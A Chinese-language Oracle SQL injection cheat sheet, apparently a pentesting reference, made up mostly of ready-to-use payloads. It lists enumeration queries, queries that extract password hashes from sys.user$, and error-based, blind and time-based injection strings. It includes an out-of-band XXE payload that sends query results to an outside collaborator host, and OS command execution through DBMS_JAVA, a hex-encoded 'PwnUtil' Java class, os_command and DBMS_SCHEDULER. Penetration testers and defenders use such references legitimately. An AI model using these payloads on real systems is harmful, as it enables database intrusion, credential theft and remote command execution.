# Oracle SQL注入

> Oracle SQL注入是一种安全漏洞类型，当攻击者可以插入或“注入”恶意的SQL代码到由Oracle数据库执行的SQL查询中时就会发生这种情况。这通常发生在用户输入没有被正确清理或参数化的情况下，允许攻击者操纵查询逻辑。这可能导致未经授权的访问、数据篡改以及其他严重的安全后果。

## 概述

* [Oracle SQL默认数据库](#oracle-sql-default-databases)
* [Oracle SQL注释](#oracle-sql-comments)
* [Oracle SQL枚举](#oracle-sql-enumeration)
* [Oracle SQL数据库凭据](#oracle-sql-database-credentials)
* [Oracle SQL方法论](#oracle-sql-methodology)
    * [Oracle SQL列出数据库](#oracle-sql-list-databases)
    * [Oracle SQL列出表](#oracle-sql-list-tables)
    * [Oracle SQL列出列](#oracle-sql-list-columns)
* [Oracle SQL基于错误的注入](#oracle-sql-error-based)
* [Oracle SQL盲注](#oracle-sql-blind)
    * [Oracle盲注与子串等效](#oracle-blind-with-substring-equivalent)
* [Oracle SQL基于时间的注入](#oracle-sql-time-based)
* [Oracle SQL带外注入](#oracle-sql-out-of-band)
* [Oracle SQL命令执行](#oracle-sql-command-execution)
    * [Oracle Java执行](#oracle-java-execution)
    * [Oracle Java类](#oracle-java-class)
* [OracleSQL文件操作](#oraclesql-file-manipulation)
    * [OracleSQL读取文件](#oraclesql-read-file)
    * [OracleSQL写入文件](#oraclesql-write-file)
    * [os_command包](#package-os_command)
    * [DBMS_SCHEDULER任务](#dbms_scheduler-jobs)
* [参考文献](#references)

## Oracle SQL默认数据库

| 名称               | 描述               |
|--------------------|-------------------|
| SYSTEM             | 所有版本可用     |
| SYSAUX             | 所有版本可用     |

## Oracle SQL注释

| 类型                | 注释       |
| ------------------- | ---------- |
| 单行注释            | `--`       |
| 多行注释            | `/**/`     |

## Oracle SQL枚举

| 描述           | SQL查询                                           |
| --------------- | ------------------------------------------------- |
| 数据库版本      | `SELECT user FROM dual UNION SELECT * FROM v$version` |
| 数据库版本      | `SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';` |
| 数据库版本      | `SELECT banner FROM v$version WHERE banner LIKE 'TNS%';` |
| 数据库版本      | `SELECT BANNER FROM gv$version WHERE ROWNUM = 1;` |
| 数据库版本      | `SELECT version FROM v$instance;`                  |
| 主机名          | `SELECT UTL_INADDR.get_host_name FROM dual;`        |
| 主机名          | `SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual;` |
| 主机名          | `SELECT UTL_INADDR.get_host_address FROM dual;`     |
| 主机名          | `SELECT host_name FROM v$instance;`                |
| 数据库名称      | `SELECT global_name FROM global_name;`              |
| 数据库名称      | `SELECT name FROM V$DATABASE;`                      |
| 数据库名称      | `SELECT instance_name FROM V$INSTANCE;`             |
| 数据库名称      | `SELECT SYS.DATABASE_NAME FROM DUAL;`               |
| 数据库名称      | `SELECT sys_context('USERENV', 'CURRENT_SCHEMA') FROM dual;` |

## Oracle SQL数据库凭据

| 查询                                   | 描述               |
|---------------------------------------|-------------------|
| `SELECT username FROM all_users;`     | 所有版本可用     |
| `SELECT name, password from sys.user$;` | 特权，<= 10g     |
| `SELECT name, spare4 from sys.user$;`  | 特权，<= 11g     |

## Oracle SQL方法论

### Oracle SQL列出数据库

```sql
SELECT DISTINCT owner FROM all_tables;
SELECT OWNER FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)
```

### Oracle SQL列出表

```sql
SELECT table_name FROM all_tables;
SELECT owner, table_name FROM all_tables;
SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';
SELECT OWNER,TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='<DBNAME>'
```

### Oracle SQL列出列

```sql
SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';
SELECT COLUMN_NAME,DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='<TABLE_NAME>' AND OWNER='<DBNAME>'
```

## Oracle SQL基于错误的注入

| 描述                     | 查询                                                |
| ------------------------ | -------------------------------------------------- |
| 无效的HTTP请求            | `SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual` |
| CTXSYS.DRITHSX.SN         | `SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual` |
| 无效的XPath              | `SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual` |
| 无效的XML                | `SELECT to_char(dbms_xmlgen.getxml('select "'||(select user from sys.dual)||'" FROM sys.dual')) FROM dual` |
| 无效的XML                | `SELECT rtrim(extract(xmlagg(xmlelement("s", username || ',')),'/s').getstringval(),',') FROM all_users` |
| SQL错误                  | `SELECT NVL(CAST(LENGTH(USERNAME) AS VARCHAR(4000)),CHR(32)) FROM (SELECT USERNAME,ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1))` |
| XDBURITYPE getblob       | `XDBURITYPE((SELECT banner FROM v$version WHERE banner LIKE 'Oracle%')).getblob()` |
| XDBURITYPE getclob       | `XDBURITYPE((SELECT table_name FROM (SELECT ROWNUM r,table_name FROM all_tables ORDER BY table_name) WHERE r=1)).getclob()` |
| XMLType                  | `AND 1337=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'~'||(REPLACE(REPLACE(REPLACE(REPLACE((SELECT banner FROM v$version),' ','_'),'$','(DOLLAR)'),'@','(AT)'),'#','(HASH)'))||'~'||CHR(62))) FROM DUAL) -- -` |
| DBMS_UTILITY             | `AND 1337=DBMS_UTILITY.SQLID_TO_SQLHASH('~'||(SELECT banner FROM v$version)||'~') -- -` |

当注入点在字符串内时使用：`'||PAYLOAD--`

## Oracle SQL盲注

| 描述                     | 查询                                              |
| ------------------------ | ------------------------------------------------ |
| 版本为12.2               | `SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%';` |
| 子查询已启用             | `SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual)` |
| 表log_table存在          | `SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table);` |
| 列message存在于表log_table中 | `SELECT COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE';` |
| 第一条消息的第一个字母是t | `SELECT message FROM log_table WHERE rownum=1 AND message LIKE 't%';` |

### Oracle盲注与子串等效

| 函数    | 示例                                   |
| ------- | ------------------------------------- |
| `SUBSTR` | `SUBSTR('foobar', <START>, <LENGTH>)` |

## Oracle SQL基于时间的注入

```sql
AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) 
AND 1337=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('RANDSTR',10) ELSE 1337 END)
```

## Oracle SQL带外注入

```sql
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```

## Oracle SQL命令执行

* [quentinhardy/odat](https://github.com/quentinhardy/odat) - ODAT（Oracle数据库攻击工具）

### Oracle Java执行

* 列出Java权限

    ```sql
    select * from dba_java_policy
    select * from user_java_policy
    ```

* 授予权限

    ```sql
    exec dbms_java.grant_permission('SCOTT', 'SYS:java.io.FilePermission','<<ALL FILES>>','execute');
    exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');
    exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');
    ```

* 执行命令
    * 10g R2, 11g R1和R2: `DBMS_JAVA_TEST.FUNCALL()`

        ```sql
        SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\windows\\system32\\cmd.exe','/c', 'dir >c:\test.txt') FROM DUAL
        SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','/bin/ls>/tmp/OUT2.LST') from dual
        ```

    * 11g R1和R2: `DBMS_JAVA.RUNJAVA()`

        ```sql
        SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c /bin/ls>/tmp/OUT.LST') FROM DUAL
        ```

### Oracle Java类

* 创建Java类

    ```sql
    BEGIN
    EXECUTE IMMEDIATE 'create or replace and compile java source named "PwnUtil" as import java.io.*; public class PwnUtil{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = "";while ((stemp = myReader.readLine()) != null) str += stemp + "\n";myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = "";while((stemp = myReader.readLine()) != null) str += stemp + "\n";myReader.close();return str;} catch (Exception e){ return e.toString();}}};';
    END;

    BEGIN
    EXECUTE IMMEDIATE 'create or replace function PwnUtilFunc(p_cmd in varchar2) return varchar2 as language java name ''PwnUtil.runCmd(java.lang.String) return String'';';
    END;

    -- hex编码的有效载荷
    SELECT TO_CHAR(dbms_xmlquery.getxml('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c61636520616e6420636f6d70696c65206a61766120736f75726365206e616d6564202270776e7574696c2220617320696d706f7274206a6176612e696f2e*;public class pwnutil{public static String runCmd(String args){try{BufferedReader myReader=new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp,str="";while((stemp=myReader.readLine())!=null)str+=stemp+"\n";myReader.close();return str;}catch(Exception e){return e.toString();}}public static String readFile(String filename){try{BufferedReader myReader=new BufferedReader(new FileReader(filename));String stemp,str="";while((stemp=myReader.readLine())!=null)str+=stemp+"\n";myReader.close();return str;}catch(Exception e){return e.toString();}}};''));
    EXECUTE IMMEDIATE utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c6163652066756e6374696f6e2050776e5574696c46756e6328705f636d6420696e207661726368617232292072657475726e207661726368617232206173206c616e6775616765206a617661206e616d65202770776e7574696c2e72756e286a6176612e6c616e672e537472696e67292072657475726e20537472696e67273b'')); end;')) results FROM dual
    ```

* 运行OS命令

    ```sql
    SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;
    ```

### 包os_command

```sql
SELECT os_command.exec_clob('<COMMAND>') cmd from dual
```

### DBMS_SCHEDULER任务

```sql
DBMS_SCHEDULER.CREATE_JOB (job_name => 'exec', job_type => 'EXECUTABLE', job_action => '<COMMAND>', enabled => TRUE)
```

## OracleSQL文件操作

:warning: 仅在堆叠查询中可用。

### OracleSQL读取文件

```sql
utl_file.get_line(utl_file.fopen('/path/to/','file','R'), <buffer>)
```

### OracleSQL写入文件

```sql
utl_file.put_line(utl_file.fopen('/path/to/','file','R'), <buffer>)
```

## 参考文献

* [ASDC12 - 新改进的从Web入侵Oracle - Sumit “sid” Siddharth - 2021年11月8日](https://web.archive.org/web/20211108150011/https://owasp.org/www-pdf-archive/ASDC12-New_and_Improved_Hacking_Oracle_From_Web.pdf)
* [基于错误的注入 | NetSPI SQL注入维基 - NetSPI - 2021年2月15日](https://sqlwiki.netspi.com/injectionTypes/errorBased/#oracle)
* [ODAT: Oracle数据库攻击工具 - quentinhardy - 2016年3月24日](https://github.com/quentinhardy/odat/wiki/privesc)
* [Oracle SQL注入速查表 - @pentestmonkey - 2011年8月30日](http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)
* [渗透测试Oracle TNS监听器 - HackTricks - 2024年7月19日](https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener)
* [SQL注入知识库 - Roberto Salgado - 2013年5月29日](https://www.websec.ca/kb/sql_injection#Oracle_Default_Databases)